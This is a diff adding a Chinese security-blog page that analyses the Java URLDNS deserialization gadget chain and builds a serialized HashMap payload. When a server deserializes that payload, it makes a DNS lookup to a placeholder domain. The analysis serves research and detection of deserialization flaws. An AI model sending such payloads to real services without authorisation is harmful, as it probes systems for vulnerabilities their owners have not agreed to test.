@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.8.0">
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="F1v3&#39;s Notes">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="F1v3">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="URLDNS 反序列化">
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="F1v3&#39;s Notes">
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="F1v3&#39;s Notes">
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article">
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary">
+    
+
+    <!-- Title -->
+    
+    <title>URLDNS 反序列化 - F1v3&#39;s Notes</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    Categories
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/blog/1597283762460.html">
+                URLDNS 反序列化
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-08-13</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/漏洞分析/">漏洞分析</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <h1 id="URLDNS-反序列化"><a href="#URLDNS-反序列化" class="headerlink" title="URLDNS 反序列化"></a>URLDNS 反序列化</h1><h2 id="触发流程"><a href="#触发流程" class="headerlink" title="触发流程"></a>触发流程</h2><p>利用链<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">  HashMap.putVal()</span><br><span class="line">    HashMap.hash()</span><br><span class="line">      URL.hashCode()</span><br></pre></td></tr></table></figure></p>
+<p>调试分析，重点看到 <code>HashMap#readObject</code> 的 <code>putVal</code> 方法：<br><img src="http://x-f1v3.github.io/images/1597284283001.png" alt="image"></p>
+<p>调用 <code>hash()</code> 来处理 key,看到 <code>hash()</code> 方法：<br><img src="http://x-f1v3.github.io/images/1597284300345.png" alt="image"></p>
+<p>调用 key 的 <code>hashCode()</code> 方法，跳到 <code>URL</code> 类的 <code>hashCode()</code><br><img src="http://x-f1v3.github.io/images/1597284318196.png" alt="image"></p>
+<p>如果 <code>hashCode</code> 等于 <code>-1</code> ,就会调用 <code>handler.hashCode</code> 方法，这里的 <code>handler</code> 是指 <code>URLStreamHandler</code>,来到 <code>URLStreamHandler.hashCode</code> 方法：<br>15959247832285.jpg<img src="http://x-f1v3.github.io/images/1597284330939.png" alt="image"></p>
+<p>该方法对 <code>http</code> 协议的各个部分计算 <code>hashCode</code>，其中 <code>getHostAddress</code> 方法就是 DNS 的触发点。跟进该方法：<br>15959256655099.jpg<img src="http://x-f1v3.github.io/images/1597284342470.png" alt="image"></p>
+<p>其中的 <code>InetAddress.getByName(host)</code> 方法对域名发起了 DNS 查询。</p>
+<p>分析完反序列化原理，反过来推 payload.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;();  // 创建HashMap，并在 key 处设置 URL 类</span><br><span class="line">URL url = new URL(&quot;http://xxx.xx.xx&quot;);  //创建 URL 类</span><br><span class="line">Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;); //获取 URL 类的 hashCode 变量</span><br><span class="line">f.setAccessible(true); //设置权限</span><br><span class="line">hashMap.put(url, &quot;1&quot;); //放入 HashMap</span><br><span class="line">f.set(url, -1);   //设置 HashCode 为-1，之前的分析，如果HashCode不是-1，不会调用 handler.hashCode 重新计算 HashCode</span><br><span class="line">ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;tmp.cer&quot;));</span><br><span class="line">oos.writeObject(hashMap); //序列化写入文件</span><br></pre></td></tr></table></figure></p>
+<p>最开始的设想是这样的，但是实际运行之后，发现会有2次 DNS 记录，分析原因是 <code>hashMap.put(url, &quot;1&quot;);</code> 这里同样会调用 <code>putVal</code> 方法，再走一遍上述流程，<br>15959279256045.jpg<img src="http://x-f1v3.github.io/images/1597284351253.png" alt="image"></p>
+<p>所以在 <code>put</code> 之前也要更改 <code>HashCode</code> 为不是-1的值，这样就不会调用  <code>handler.hashCode</code> 计算 <code>hashcode</code>.<br>最后的 payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;();  // 创建HashMap，并在 key 处设置 URL 类</span><br><span class="line">URL url = new URL(&quot;http://xxx.xx.xx&quot;);   //创建 URL 类</span><br><span class="line">Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);  //获取 URL 类的 hashCode 变量</span><br><span class="line">f.setAccessible(true); //设置权限</span><br><span class="line">f.set(url, -122); //HashCode不是-1，不会调用 handler.hashCode 重新计算 HashCode </span><br><span class="line">hashMap.put(url, &quot;1&quot;); //放入 HashMap</span><br><span class="line">f.set(url, -1);  //设置 HashCode 为-1，之前的分析，如果HashCode不是-1，不会调用 handler.hashCode 重新计算 HashCode</span><br><span class="line"> ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;tmp.cer&quot;));</span><br><span class="line">oos.writeObject(hashMap); //序列化写入文件</span><br></pre></td></tr></table></figure></p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/Java/">#Java</a> <a href="/tags/反序列化/">#反序列化</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/blog/1597283762460.html">URLDNS 反序列化</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/blog/1577679142463.html">CVE-2019-17571</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/blog/1575618238391.html">攻击JMX RMI</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/blog/1573541964775.html">hydra问题</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
+    <h2>Categories</h2>
+    <ul>
+        
+        <li>
+            <a class="footer-post" href="/categories/学习/">学习</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/系统环境/">系统环境</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/Java代码审计/">Java代码审计</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/日常姿势/">日常姿势</a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
